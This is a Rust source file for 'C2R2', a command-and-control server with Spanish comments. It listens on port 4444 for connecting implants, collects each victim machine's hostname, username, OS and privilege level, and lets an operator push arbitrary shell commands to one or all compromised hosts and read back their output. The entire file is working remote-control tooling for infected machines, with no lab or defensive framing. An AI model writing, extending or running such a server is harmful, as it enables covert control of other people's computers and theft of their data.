use tokio::net::{TcpListener, TcpStream};
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::sync::mpsc;
use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use std::sync::atomic::{AtomicU64, Ordering};
use std::io::{self, BufRead, Write};
use clap::Parser;
use chrono::Local;

type ClientId = u64;

const DELIMITER: &str = "\n<<END>>\n";

#[derive(Parser)]
#[command(name = "c2r2-server")]
#[command(about = "C2R2 Command & Control Server", long_about = None)]
struct Args {
    /// Dirección IP donde bindear (0.0.0.0 para todas las interfaces)
    #[arg(short, long, default_value = "0.0.0.0")]
    bind: String,

    /// Puerto donde escuchar conexiones
    #[arg(short, long, default_value_t = 4444)]
    port: u16,
    
    /// Modo verboso
    #[arg(short, long)]
    verbose: bool,
}

// Información del cliente
#[derive(Clone)]
struct ClientInfo {
    id: ClientId,
    addr: String,
    hostname: Option<String>,
    username: Option<String>,
    os_version: Option<String>,
    privileges: Option<String>,
    connected_at: String,
}

impl ClientInfo {
    fn new(id: ClientId, addr: String) -> Self {
        Self {
            id,
            addr,
            hostname: None,
            username: None,
            os_version: None,
            privileges: None,
            connected_at: Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
        }
    }
}

// Estructura para manejar cada cliente
struct ClientHandle {
    id: ClientId,
    info: Arc<Mutex<ClientInfo>>,
    tx: mpsc::UnboundedSender<String>,
}

// Maneja la comunicación con un cliente
async fn handle_client(
    id: ClientId,
    stream: TcpStream,
    clients: Arc<Mutex<HashMap<ClientId, ClientHandle>>>,
    verbose: bool,
) {
    let addr = stream.peer_addr().unwrap().to_string();
    println!("🔗 Nuevo cliente [{}] desde {}", id, addr);

    let (tx, mut rx) = mpsc::unbounded_channel::<String>();
    let client_info = Arc::new(Mutex::new(ClientInfo::new(id, addr.clone())));
    
    {
        let mut clients = clients.lock().unwrap();
        clients.insert(id, ClientHandle {
            id,
            info: client_info.clone(),
            tx,
        });
    }

    let (reader, mut writer) = stream.into_split();
    let mut reader = BufReader::new(reader);

    // Tarea para enviar comandos al cliente con keep-alive
    let send_task = tokio::spawn(async move {
        let mut ping_interval = tokio::time::interval(tokio::time::Duration::from_secs(30));
        ping_interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Skip);
        
        loop {
            tokio::select! {
                Some(cmd) = rx.recv() => {
                    let message = format!("{}\n", cmd);
                    if let Err(e) = writer.write_all(message.as_bytes()).await {
                        if verbose {
                            eprintln!("❌ Error enviando a cliente {}: {}", id, e);
                        }
                        break;
                    }
                    if let Err(e) = writer.flush().await {
                        if verbose {
                            eprintln!("❌ Error en flush cliente {}: {}", id, e);
                        }
                        break;
                    }
                }
                _ = ping_interval.tick() => {
                    // Enviar ping silencioso para mantener conexión viva
                    if verbose {
                        println!("🏓 Enviando ping a cliente [{}]", id);
                    }
                    if let Err(_) = writer.write_all(b"ping\n").await {
                        if verbose {
                            eprintln!("❌ Error en ping a cliente {}", id);
                        }
                        break;
                    }
                    if let Err(_) = writer.flush().await {
                        break;
                    }
                }
            }
        }
    });

    // Tarea para recibir respuestas del cliente
    let info = client_info.clone();
    let recv_task = tokio::spawn(async move {
        let mut command_buffer = String::new();
        
        loop {
            let mut line = String::new();
            match reader.read_line(&mut line).await {
                Ok(0) => {
                    if verbose {
                        println!("🔌 Cliente {} cerró la conexión", id);
                    }
                    return;
                }
                Ok(_) => {
                    // Si es sysinfo, procesar inmediatamente
                    if line.starts_with("__SYSINFO__:") {
                        // Formato: __SYSINFO__:tipo:valor
                        let parts: Vec<&str> = line.trim().splitn(3, ':').collect();
                        if parts.len() >= 3 {
                            let mut info = info.lock().unwrap();
                            match parts[1] {
                                "hostname" => {
                                    info.hostname = Some(parts[2].to_string());
                                    if verbose {
                                        println!("📝 Cliente [{}] hostname: {}", id, parts[2]);
                                    }
                                }
                                "username" => {
                                    info.username = Some(parts[2].to_string());
                                    if verbose {
                                        println!("📝 Cliente [{}] username: {}", id, parts[2]);
                                    }
                                }
                                "os" => {
                                    info.os_version = Some(parts[2].to_string());
                                    if verbose {
                                        println!("📝 Cliente [{}] OS: {}", id, parts[2]);
                                    }
                                }
                                "privileges" => {
                                    info.privileges = Some(parts[2].to_string());
                                    if verbose {
                                        println!("📝 Cliente [{}] privileges: {}", id, parts[2]);
                                    }
                                }
                                _ => {}
                            }
                        }
                        continue;
                    }
                    
                    // Si es pong, ignorar
                    if line.trim() == "pong" {
                        if verbose {
                            println!("🏓 Pong recibido de cliente [{}]", id);
                        }
                        continue;
                    }
                    
                    // Para comandos, acumular hasta encontrar delimitador
                    command_buffer.push_str(&line);
                    if command_buffer.contains(DELIMITER) {
                        let response = command_buffer.replace(DELIMITER, "").trim().to_string();
                        if !response.is_empty() {
                            println!("\n📨 Respuesta del cliente [{}]:", id);
                            println!("{}", response);
                            println!();
                        }
                        command_buffer.clear();
                    }
                }
                Err(e) => {
                    if verbose {
                        eprintln!("⚠️ Error leyendo de cliente {}: {}", id, e);
                    }
                    return;
                }
            }
        }
    });

    // Esperar a que termine alguna tarea
    tokio::select! {
        _ = send_task => {},
        _ = recv_task => {},
    }

    // Limpiar cliente
    clients.lock().unwrap().remove(&id);
    println!("❌ Cliente [{}] desconectado", id);
}

#[tokio::main]
async fn main() {
    let args = Args::parse();

    println!("🚀 C2R2 Server v1.0");
    println!("🔗 Escuchando en {}:{}", args.bind, args.port);
    println!("📝 Use /help para ver comandos disponibles");
    if args.verbose {
        println!("🔍 Modo verbose activado");
    }
    println!("{}", "-".repeat(50));

    let listener = TcpListener::bind(format!("{}:{}", args.bind, args.port))
        .await
        .expect("No se pudo iniciar el servidor");

    let clients: Arc<Mutex<HashMap<ClientId, ClientHandle>>> = Arc::new(Mutex::new(HashMap::new()));
    let next_id = Arc::new(AtomicU64::new(1));
    let selected_client: Arc<Mutex<Option<ClientId>>> = Arc::new(Mutex::new(None));

    // Tarea para aceptar conexiones
    let clients_clone = clients.clone();
    let next_id_clone = next_id.clone();
    let verbose = args.verbose;
    tokio::spawn(async move {
        loop {
            match listener.accept().await {
                Ok((stream, _)) => {
                    let id = next_id_clone.fetch_add(1, Ordering::SeqCst);
                    let clients = clients_clone.clone();
                    tokio::spawn(handle_client(id, stream, clients, verbose));
                }
                Err(e) => {
                    eprintln!("❌ Error aceptando conexión: {}", e);
                }
            }
        }
    });

    // Loop para comandos del usuario
    let stdin = io::stdin();
    let mut lines = stdin.lock().lines();

    loop {
        print!("> ");
        let _ = io::stdout().flush();

        if let Some(Ok(line)) = lines.next() {
            let parts: Vec<&str> = line.trim().split_whitespace().collect();
            
            if parts.is_empty() {
                continue;
            }

            match parts[0] {
                "/help" => {
                    println!("📖 Comandos disponibles:");
                    println!("  /list                    -> lista clientes conectados con info");
                    println!("  /select <id>             -> selecciona un cliente por ID");
                    println!("  /cmd <comando>           -> envía comando al cliente seleccionado");
                    println!("  /cmd_all <comando>       -> envía comando a todos los clientes");
                    println!("  /exit, /quit             -> cierra el servidor");
                    println!("  /help                    -> muestra esta ayuda");
                }
                "/list" => {
                    let clients = clients.lock().unwrap();
                    if clients.is_empty() {
                        println!("  No hay clientes conectados");
                    } else {
                        println!("\n📋 Clientes conectados:");
                        println!("{}", "=".repeat(130));
                        println!("{:<4} {:<22} {:<18} {:<18} {:<25} {:<12} {:<20}", 
                            "ID", "Dirección", "Hostname", "Usuario", "OS", "Privilegios", "Conectado");
                        println!("{}", "-".repeat(130));
                        
                        for (id, client) in clients.iter() {
                            let info = client.info.lock().unwrap();
                            println!("{:<4} {:<22} {:<18} {:<18} {:<25} {:<12} {:<20}",
                                id,
                                info.addr,
                                info.hostname.as_deref().unwrap_or("Recopilando..."),
                                info.username.as_deref().unwrap_or("Recopilando..."),
                                info.os_version.as_deref().unwrap_or("Recopilando..."),
                                info.privileges.as_deref().unwrap_or("Recopilando..."),
                                info.connected_at
                            );
                        }
                        println!("{}", "=".repeat(130));
                    }
                }
                "/select" => {
                    if parts.len() < 2 {
                        println!("❌ Uso: /select <id>");
                        continue;
                    }
                    
                    if let Ok(id) = parts[1].parse::<ClientId>() {
                        let clients = clients.lock().unwrap();
                        if clients.contains_key(&id) {
                            *selected_client.lock().unwrap() = Some(id);
                            println!("✅ Cliente [{}] seleccionado", id);
                            println!("ℹ️ Ahora puedes usar /cmd <comando>");
                        } else {
                            println!("❌ Cliente {} no encontrado", id);
                        }
                    } else {
                        println!("❌ ID inválido");
                    }
                }
                "/cmd" => {
                    if parts.len() < 2 {
                        println!("❌ Uso: /cmd <comando>");
                        continue;
                    }
                    
                    let command = parts[1..].join(" ");
                    let selected = *selected_client.lock().unwrap();
                    
                    if let Some(id) = selected {
                        let clients = clients.lock().unwrap();
                        
                        if let Some(client) = clients.get(&id) {
                            if let Err(e) = client.tx.send(command.clone()) {
                                println!("❌ Error enviando comando: {}", e);
                            } else {
                                println!("📤 Comando enviado a [{}]: {}", id, command);
                            }
                        } else {
                            println!("❌ Cliente {} no encontrado, deseleccionando", id);
                            *selected_client.lock().unwrap() = None;
                        }
                    } else {
                        println!("❌ No hay cliente seleccionado. Use /select <id>");
                    }
                }
                "/cmd_all" => {
                    if parts.len() < 2 {
                        println!("❌ Uso: /cmd_all <comando>");
                        continue;
                    }
                    
                    let command = parts[1..].join(" ");
                    let clients = clients.lock().unwrap();
                    
                    if clients.is_empty() {
                        println!("❌ No hay clientes conectados");
                    } else {
                        let mut count = 0;
                        for (id, client) in clients.iter() {
                            if client.tx.send(command.clone()).is_ok() {
                                println!("📤 Comando enviado a [{}]", id);
                                count += 1;
                            }
                        }
                        println!("✅ Comando enviado a {} cliente(s)", count);
                    }
                }
                "/exit" | "/quit" => {
                    println!("👋 Cerrando servidor...");
                    std::process::exit(0);
                }
                _ => {
                    println!("❌ Comando desconocido. Use /help");
                }
            }
        }
    }
}
